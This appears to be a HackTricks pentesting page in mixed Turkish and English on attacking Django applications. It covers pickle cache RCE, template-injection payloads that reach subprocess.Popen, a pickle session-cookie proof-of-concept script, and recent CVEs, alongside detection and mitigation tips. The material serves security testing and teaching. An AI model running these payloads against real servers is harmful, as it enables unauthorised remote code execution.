# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
Django's default cache storage method is [Python pickles](https://docs.python.org/3/library/pickle.html), which can lead to RCE if [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **Bir saldırgan cache'e yazma erişimi elde edebilirse, bu zafiyeti altta yatan sunucuda RCE'ye yükseltebilir.**

Django cache is stored in one of four places: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), or a [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Redis sunucusunda veya veritabanında saklanan cache'ler en olası saldırı vektörleridir (Redis injection ve SQL injection), ancak bir saldırgan dosya tabanlı cache'i kullanarak rastgele bir yazmayı RCE'ye dönüştürebilir. Bakımcılar bunu non-issue olarak işaretlemişlerdir. Cache dosya klasörü, SQL tablo adı ve Redis sunucu detaylarının uygulamaya göre değişeceğini not etmek önemlidir.

This HackerOne report provides a great, reproducible example of exploiting Django cache stored in a SQLite database: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
The Django Template Language (DTL) is **Turing-complete**. If user-supplied data is rendered as a *template string* (for example by calling `Template(user_input).render()` or when `|safe`/`format_html()` removes auto-escaping), an attacker may achieve full SSTI → RCE.

### Detection
1. Dinamik `Template()` / `Engine.from_string()` / `render_to_string()` çağrılarını, *herhangi bir* temizlenmemiş istek verisi içerip içermediği açısından kontrol edin.
2. Zaman tabanlı veya aritmetik bir payload gönderin:
```django
{{7*7}}
```
Eğer render edilen çıktı `49` içeriyorsa, giriş template motoru tarafından derleniyor demektir.

### Primitive to RCE
Django blocks direct access to `__import__`, but the Python object graph is reachable:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
`subprocess.Popen`'in indeksini bulun (Python build'e bağlı olarak ≈400–500 arası) ve herhangi bir komutu çalıştırın:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
Daha güvenli evrensel bir gadget, `cls.__name__ == 'Popen'` olana kadar yinelemektir.

Aynı gadget, kullanıcı girdisini hatalı işleyen **Debug Toolbar** veya **Django-CMS** template rendering özellikleri için de çalışır.

---

### Ayrıca bak: ReportLab/xhtml2pdf PDF export RCE
Django üzerine kurulu uygulamalar genelde görünümleri (views) PDF olarak dışa aktarmak için xhtml2pdf/ReportLab'ı entegre eder. Kullanıcı kontrollü HTML PDF üretimine aktarıldığında, rl_safe_eval üçlü parantezler içindeki `[[[ ... ]]]` ifadeleri değerlendirebilir ve bu da kod yürütülmesine olanak tanır (CVE-2023-33733). Detaylar, payload'lar ve mitigasyonlar:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
Eğer `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` ayarı etkinse (veya pickle deserialize eden bir custom serializer kullanılıyorsa), Django session cookie'sini herhangi bir view kodu çağrılmadan önce *decrypt eder ve unpickle eder*. Bu nedenle geçerli bir signing key'e sahip olmak (varsayılan olarak proje `SECRET_KEY`) anında uzaktan kod yürütme için yeterlidir.

### İstismar Gereksinimleri
* Sunucu `PickleSerializer` kullanıyor.
* Saldırgan `settings.SECRET_KEY`'i biliyor veya tahmin edebiliyor (leaks via GitHub, `.env`, error pages, etc.).

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Send the resulting cookie, and the payload runs with the permissions of the WSGI worker.

**Mitigations**: Keep the default `JSONSerializer`, rotate `SECRET_KEY`, and configure `SESSION_COOKIE_HTTPONLY`.

---

## Recent (2023-2025) High-Impact Django CVEs Pentesters Should Check
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (fixed June 4 2025). Saldırganların log dosyalarına yeni satır/ANSI kodları sokmasına ve downstream log analizini zehirlemesine izin verir. Yama seviyesi ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). JSON anahtarları oluşturarak tırnaklamadan çıkıp arbitrary SQL çalıştırılmasına imkan verir. Fixed in 4.2.15 / 5.0.8.

Her zaman exact framework versiyonunu `X-Frame-Options` hata sayfası veya `/static/admin/css/base.css` hash'i ile fingerprintleyin ve yukarıdakileri uygun durumlarda test edin.

---

## References
* Django security release – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Jun 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Aug 2024.
* 0xdf: University (HTB) – xhtml2pdf/ReportLab CVE-2023-33733'ü istismar ederek RCE elde etme ve AD'e pivot yapma – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
